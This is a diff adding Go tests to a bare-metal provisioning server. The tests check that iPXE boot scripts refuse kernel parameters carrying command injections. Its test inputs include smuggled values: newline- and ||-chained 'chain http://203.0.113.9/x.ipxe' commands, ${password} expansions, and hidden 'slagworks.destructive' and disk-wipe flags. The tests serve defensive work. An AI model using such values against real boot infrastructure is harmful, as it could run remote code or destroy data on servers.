@@ -6,6 +6,7 @@ import (
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 
@@ -256,7 +257,49 @@ func TestBootHandler_ConsoleArgs(t *testing.T) {
 			wantContains: []string{"kernel "},
 			wantAbsent:   []string{"console="},
 		},
+		// The agent trims the field before using it (bootloader.go
+		// FetchKernelParams), and a value written through the NetBox API
+		// can carry a trailing newline (a YAML block scalar does). Served
+		// raw, that newline ended the iPXE kernel command after the console
+		// arguments and ran BOOTIF=... boot=slagworks ... as a command of
+		// its own.
+		{
+			name:         "surrounding whitespace is trimmed",
+			kernelParams: "console=ttyS0,115200n8\n",
+			wantContains: []string{"console=tty0 console=ttyS0,115200n8 BOOTIF=01-"},
+		},
+		{
+			name:         "none with surrounding whitespace still opts out",
+			kernelParams: " none\n",
+			wantContains: []string{"kernel "},
+			wantAbsent:   []string{"console="},
+		},
 	}
+	// A value iPXE would read as more than kernel arguments must refuse the
+	// boot in every mode: a newline starts a new iPXE command, a standalone
+	// ||, && or ; chains one, a word starting with # comments out the rest of
+	// the kernel line, ${...} expands an iPXE setting, and non-ASCII or
+	// control bytes split words differently in iPXE and the kernel (the
+	// kernel counts 0xa0 as a space). The value itself is never echoed into
+	// the error script, since it is exactly what can't be trusted there.
+	refused := func(name, kp string) tcase {
+		return tcase{
+			name:         name,
+			kernelParams: kp,
+			wantContains: []string{"ERROR: slagworks_kernel_params", "shell"},
+			wantAbsent:   []string{"kernel ", "chain", "slagworks.destructive", "BOOTIF"},
+		}
+	}
+	configured = append(configured,
+		refused("a newline inside the value refuses the boot", "console=ttyS1,115200n8\nchain http://203.0.113.9/x.ipxe"),
+		refused("an iPXE || refuses the boot", "console=ttyS1,115200n8 || chain http://203.0.113.9/x.ipxe"),
+		refused("an iPXE && refuses the boot", "console=ttyS1,115200n8 && chain http://203.0.113.9/x.ipxe"),
+		refused("an iPXE ; refuses the boot", "console=ttyS1,115200n8 ; chain http://203.0.113.9/x.ipxe"),
+		refused("a # word refuses the boot", "console=ttyS1,115200n8 #slagworks.destructive"),
+		refused("an iPXE setting reference refuses the boot", "console=ttyS1,115200n8 x=${net0/mac}"),
+		refused("a tab refuses the boot", "console=ttyS1,115200n8\tslagworks.destructive"),
+		refused("a non-ASCII byte refuses the boot", "console=ttyS1,115200n8 slagworks.destructive"),
+	)
 	// Unset field: deploy and plain kernel boots refuse; commission
 	// broadcasts on every candidate so the sweep can determine.
 	unsetByMode := map[string]tcase{
@@ -591,6 +634,92 @@ func TestDeployBootScript_TailscaleHostnameRequiresKey(t *testing.T) {
 	body := w.Body.String()
 	if strings.Contains(body, "slagworks.tailscale_hostname") {
 		t.Errorf("hostname token emitted without an auth key, got %q", body)
+	}
+}
+
+// TestDeployBootScript_FreeTextValuesRideAsOneArgument: the deploy script puts
+// op-param and snapshot values on the iPXE kernel line as key=value kernel
+// arguments, and the BOOT hook and agent read them back by splitting
+// /proc/cmdline on whitespace. Values inside their documented space arrive as
+// exactly one argument each.
+func TestDeployBootScript_FreeTextValuesRideAsOneArgument(t *testing.T) {
+	raw, _ := json.Marshal(model.OpParams{
+		FatalAt: "installing_bootloader", Efivarfs: "skip", DataMarker: "m-1.x_y",
+		TailscaleRuntime: &model.TailscaleRuntime{AuthKey: "tskey-auth-kABC123-abcdefghijklmnop", Hostname: "oob-gw-3-pop2"},
+	})
+	body := deployScriptFor(t, string(raw), func(p *model.InMemoryProvider, id uuid.UUID) {
+		p.SetSystemUUID(id, "550e8400-e29b-41d4-a716-446655440000")
+	})
+	var args []string
+	for _, line := range strings.Split(body, "\n") {
+		if f := strings.Fields(line); len(f) > 2 && f[0] == "kernel" {
+			args = f[2:]
+		}
+	}
+	for _, arg := range []string{
+		"slagworks.fatal_at=installing_bootloader", "slagworks.efivarfs=skip", "slagworks.data_marker=m-1.x_y",
+		"slagworks.tailscale_authkey=tskey-auth-kABC123-abcdefghijklmnop", "slagworks.tailscale_hostname=oob-gw-3-pop2",
+		"slagworks.expect-uuid=550e8400-e29b-41d4-a716-446655440000",
+	} {
+		if !slices.Contains(args, arg) {
+			t.Errorf("expected kernel argument %q, got %q", arg, body)
+		}
+	}
+}
+
+// TestDeployBootScript_RefusesValuesThatSplitTheKernelLine: a value that
+// can't ride the kernel line as one argument refuses the boot instead of
+// adding kernel arguments or iPXE commands. Whitespace splits it into more
+// kernel arguments (the BOOT hook maps a bare slagworks.destructive to the
+// agent's --destructive), a newline ends the iPXE kernel command and starts
+// another, ${...} makes iPXE expand a setting, a trailing backslash joins the
+// next script line onto the kernel line, and the kernel treats byte 0xa0 as a
+// space where iPXE does not. The tailnet hostname is derived from the
+// free-text NetBox device name (internal/api tailnetHostname), so a device
+// named "kworker slagworks.destructive x.pop2" must not turn a
+// non-destructive deploy destructive.
+func TestDeployBootScript_RefusesValuesThatSplitTheKernelLine(t *testing.T) {
+	const goodUUID = "550e8400-e29b-41d4-a716-446655440000"
+	ts := func(key, host string) model.OpParams {
+		return model.OpParams{TailscaleRuntime: &model.TailscaleRuntime{AuthKey: key, Hostname: host}}
+	}
+	for _, tc := range []struct {
+		name    string
+		params  model.OpParams
+		sysUUID string
+	}{
+		{"tailnet hostname with spaces", ts("tskey-auth-K9", "kworker slagworks.destructive slagworks.wipe_all_disks x-pop2"), goodUUID},
+		{"tailnet hostname with a non-ASCII space", ts("tskey-auth-K9", "kworker slagworks.destructive"), goodUUID},
+		{"auth key with a newline", ts("tskey-auth-K9\nchain http://203.0.113.9/x.ipxe", "oob-gw-3-pop2"), goodUUID},
+		{"fatal_at with an iPXE setting reference", model.OpParams{FatalAt: "${password}"}, goodUUID},
+		{"efivarfs with a tab", model.OpParams{Efivarfs: "skip\tslagworks.destructive"}, goodUUID},
+		{"data_marker with a space", model.OpParams{DataMarker: "m slagworks.destructive"}, goodUUID},
+		{"data_marker with a double quote", model.OpParams{DataMarker: `m"`}, goodUUID},
+		{"system UUID with a space", model.OpParams{}, goodUUID + " slagworks.destructive"},
+		{"system UUID ending in a backslash", model.OpParams{}, goodUUID + `\`},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			raw, err := json.Marshal(tc.params)
+			if err != nil {
+				t.Fatal(err)
+			}
+			body := deployScriptFor(t, string(raw), func(p *model.InMemoryProvider, id uuid.UUID) {
+				p.SetSystemUUID(id, tc.sysUUID)
+			})
+			if strings.Contains(body, "kernel ") {
+				t.Fatalf("expected the boot to be refused, got an installer:\n%s", body)
+			}
+			for _, want := range []string{"ERROR:", "cannot ride the boot cmdline", "shell"} {
+				if !strings.Contains(body, want) {
+					t.Errorf("expected %q in the refusal script, got:\n%s", want, body)
+				}
+			}
+			for _, absent := range []string{"slagworks.destructive", "chain", "${password}"} {
+				if strings.Contains(body, absent) {
+					t.Errorf("refusal script echoes the offending value (%q):\n%s", absent, body)
+				}
+			}
+		})
 	}
 }
 
